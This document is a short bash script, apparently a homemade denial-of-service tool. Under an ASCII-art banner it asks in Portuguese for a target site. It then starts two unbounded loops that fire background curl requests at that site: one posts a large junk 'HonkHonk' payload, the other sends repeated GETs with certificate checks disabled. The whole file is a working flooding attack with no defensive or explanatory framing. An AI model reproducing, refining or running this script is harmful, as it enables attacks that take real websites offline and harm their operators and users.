#!/bin/bash

banner="╭╮╱╭┳━━━┳━━━┳━━━┳━━━┳━━━━┳━━━┳━━━┳╮╭━┳━━━┳╮╱╭╮
┃┃╱┃┃╭━╮┃╭━╮┃╭━╮┃╭━━┫╭╮╭╮┃╭━╮┃╭━╮┃┃┃╭┫╭━╮┃┃╱┃┃
┃╰━╯┃┃╱┃┃╰━╯┃╰━━┫╰━━╋╯┃┃╰┫┃╱┃┃┃╱╰┫╰╯╯┃╰━━┫╰━╯┃
┃╭━╮┃┃╱┃┃╭╮╭┻━━╮┃╭━━╯╱┃┃╱┃╰━╯┃┃╱╭┫╭╮┃╰━━╮┃╭━╮┃
┃┃╱┃┃╰━╯┃┃┃╰┫╰━╯┃╰━━╮╱┃┃╱┃╭━╮┃╰━╯┃┃┃╰┫╰━╯┃┃╱┃┃
╰╯╱╰┻━━━┻╯╰━┻━━━┻━━━╯╱╰╯╱╰╯╱╰┻━━━┻╯╰━┻━━━┻╯╱╰╯"

echo "$banner"
read -p "DIGITE O SITE ALVO: " site

while true; do
curl -X POST -d "HonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonk" "$site" &
done &
while true; do
curl -k "$site" &
done
